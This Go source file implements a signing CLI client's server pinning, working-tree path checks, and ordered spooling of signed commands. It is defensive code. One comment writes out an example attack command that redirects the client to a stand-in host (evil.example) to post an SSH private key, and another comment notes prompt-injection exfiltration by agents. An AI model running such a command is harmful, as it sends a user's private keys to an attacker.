package cli

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// The client is a signing oracle by design: it holds a key and will sign what
// it is asked to sign. What it can guarantee is not that it refuses to sign,
// but where the signature goes and how far a bad one reaches.

// PinServer records the hub a seat enrolled against.
func PinServer(actor, server string) error {
	if err := os.MkdirAll(stateDir(), 0o700); err != nil {
		return err
	}
	return os.WriteFile(pinPath(actor), []byte(server+"\n"), 0o600)
}

// PinnedServer is the hub this seat belongs to, or "" if it predates pinning.
func PinnedServer(actor string) string {
	raw, err := os.ReadFile(pinPath(actor))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(raw))
}

func pinPath(actor string) string { return filepath.Join(stateDir(), safeName(actor)+".server") }

func safeName(actor string) string {
	return strings.NewReplacer("/", "_", ":", "_", string(filepath.Separator), "_").Replace(actor)
}

// CheckServer refuses to sign for a hub the seat did not enrol against.
// `COMMS_SERVER=http://evil.example comms attach ~/.ssh/id_ed25519`
// needs no key material, leaves nothing in argv, and is indistinguishable from
// ordinary use — so the seat file is authoritative and the environment is not.
func CheckServer(e *Env, actor string) int {
	pinned := PinnedServer(actor)
	if pinned == "" || sameServer(pinned, e.Server) {
		return 0
	}
	return e.Out.Fail(ExitUsage, "usage", "server.mismatch",
		"seat "+actor+" enrolled against "+pinned+" and this command would sign for "+
			e.Server+". The seat file is authoritative: a signature is a capability, "+
			"and an environment variable must not be able to redirect one. "+
			"Enrol a separate seat for the other hub")
}

func sameServer(a, b string) bool {
	return strings.TrimRight(a, "/") == strings.TrimRight(b, "/")
}

// WithinTree reports whether a path is inside the working tree. `attach` reads
// a file and posts its contents, so an unbounded path turns one prompt-injected
// line into exfiltration of anything the agent can read.
func WithinTree(path string) error {
	if path == "-" {
		return nil // stdin is the documented path and carries no path at all
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
		abs = resolved // a symlink out of the tree is still out of the tree
	}
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}
	if resolved, err := filepath.EvalSymlinks(cwd); err == nil {
		cwd = resolved
	}
	rel, err := filepath.Rel(cwd, abs)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return fmt.Errorf("%s is outside the working tree; attach reads a file and posts "+
			"its contents, so the tree is the boundary. Pipe it on stdin if you meant to", path)
	}
	return nil
}

// spooled is one command held because the transport failed. The exact bytes and
// the exact signature are kept together: re-serializing would change the bytes
// the signature covers, and re-signing is impossible because the retry unit is
// the pair, not the command.
type spooled struct {
	Actor     string `json:"actor"`
	Server    string `json:"server"`
	Payload   string `json:"payload"`
	Signature string `json:"signature"`
	Kind      string `json:"kind"`
	Idem      string `json:"idem"`
	At        string `json:"at"`
}

func spoolDir() string { return filepath.Join(stateDir(), "spool") }

// Spool holds a command whose transport failed. Reporting failure here would be
// wrong: an exit code that reads as failure is an instruction to every harness
// in existence to run the command again, and there is no --idem flag to make
// that safe.
func Spool(actor, server, kind, idem string, payload []byte, sig string, at time.Time) error {
	if kind == "status" {
		// Never spooled. A late --step 2 landing after a live --step 5 would
		// rewind the progress projection; the server drops it now, but a status
		// that is minutes stale is noise even when it is ordered correctly.
		return nil
	}
	if err := os.MkdirAll(spoolDir(), 0o700); err != nil {
		return err
	}
	if err := os.Chmod(spoolDir(), 0o700); err != nil {
		return err
	}
	raw, err := json.Marshal(spooled{
		Actor: actor, Server: server, Payload: string(payload), Signature: sig,
		Kind: kind, Idem: idem, At: at.UTC().Format(time.RFC3339Nano),
	})
	if err != nil {
		return err
	}
	// The name orders the queue: FIFO, because a handoff that overtakes the
	// finding it refers to arrives without its context.
	name := fmt.Sprintf("%d-%s-%s.json", at.UnixNano(), safeName(actor), idem)
	path := filepath.Join(spoolDir(), name)
	if err := os.WriteFile(path, raw, 0o600); err != nil {
		return err
	}
	return os.Chmod(path, 0o600)
}

// SpooledFor lists this seat's held commands, oldest first.
func SpooledFor(actor string) []string {
	entries, err := os.ReadDir(spoolDir())
	if err != nil {
		return nil
	}
	var out []string
	for _, entry := range entries {
		if !strings.HasSuffix(entry.Name(), ".json") {
			continue
		}
		raw, err := os.ReadFile(filepath.Join(spoolDir(), entry.Name()))
		if err != nil {
			continue
		}
		var s spooled
		if json.Unmarshal(raw, &s) != nil || s.Actor != actor {
			continue
		}
		out = append(out, filepath.Join(spoolDir(), entry.Name()))
	}
	sort.Strings(out) // the name begins with a nanosecond timestamp
	return out
}

// DropSpool discards a seat's held commands. A revoked key must not have a
// queue of signed bytes waiting to land the moment somebody re-enrols the seat.
func DropSpool(actor string) int {
	n := 0
	for _, path := range SpooledFor(actor) {
		if os.Remove(path) == nil {
			n++
		}
	}
	return n
}

// Drain sends held commands in order. It stops at the first failure, because
// order is the point: sending 3 after 1 failed puts a reply before its question.
func Drain(e *Env, actor string) (sent int, held int) {
	paths := SpooledFor(actor)
	for i, path := range paths {
		raw, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		var s spooled
		if json.Unmarshal(raw, &s) != nil {
			os.Remove(path) // unreadable and unfixable; keeping it blocks the queue forever
			continue
		}
		if !sameServer(s.Server, e.Server) {
			continue // spooled for a different hub; not ours to send
		}
		status, body, err := postExact(e.Server, []byte(s.Payload), s.Signature)
		if err != nil {
			return sent, len(paths) - i
		}
		if status == 401 || body.Invariant == "key.revoked" || body.Invariant == "key.compromised" {
			// The seat is gone. Everything behind this is unsendable too.
			DropSpool(actor)
			return sent, 0
		}
		os.Remove(path)
		sent++
	}
	return sent, 0
}

// SignatureDigest is what --dry-run prints instead of the signature. A
// signature over posted bytes is a portable, replayable capability: anything
// that reads the transcript can post as this seat.
func SignatureDigest(sig string) string {
	sum := sha256.Sum256([]byte(sig))
	return hex.EncodeToString(sum[:])[:16]
}

// spoolOrFail holds a command whose transport failed and reports success.
// Reporting failure would be an instruction to every harness in existence to
// run the command again, and there is no --idem flag to make that safe.
func spoolOrFail(e *Env, c *Client, cmd map[string]any, sent Sent, cause error) int {
	kind, _ := cmd["kind"].(string)
	idem, _ := cmd["idem"].(string)

	if kind == "status" {
		// Deliberately dropped rather than held. Progress is a fold on the
		// current state of the work, and a status that lands minutes late says
		// something that stopped being true before it arrived.
		e.Out.Note("status dropped: %v", cause)
		return e.Out.Succeed(Result{
			Outcome: "dropped", Invariant: "transport.failed",
			Detail: "a status is not spooled; it describes now, and a late one describes " +
				"a moment that has passed. Post the next status when the server is back",
		})
	}

	if err := Spool(c.Actor, c.Server, kind, idem, sent.Bytes, sent.Signature, time.Now()); err != nil {
		return e.Out.Fail(ExitInternal, "internal", "spool.unwritable", err.Error())
	}
	e.Out.Note("held %s for the next write: %v", kind, cause)
	return e.Out.Succeed(Result{
		Outcome: "spooled", Invariant: "transport.failed", Detail: cause.Error(),
		Next: "nothing to do; the exact signed bytes are held and the next write verb " +
			"sends them in order. Do not re-run this command",
	})
}

// drainFirst empties the spool before a new write, in order. It runs on every
// write verb rather than on a daemon, because the client has no daemon and a
// held command that only leaves on an explicit `flush` is a held command
// forever.
func drainFirst(e *Env, actor string) {
	if len(SpooledFor(actor)) == 0 {
		return
	}
	sent, held := Drain(e, actor)
	if sent > 0 {
		e.Out.Line(map[string]any{
			"type": "drained", "sent": sent, "held": held,
			"detail": "commands held while the server was unreachable, sent in order",
		})
	}
}
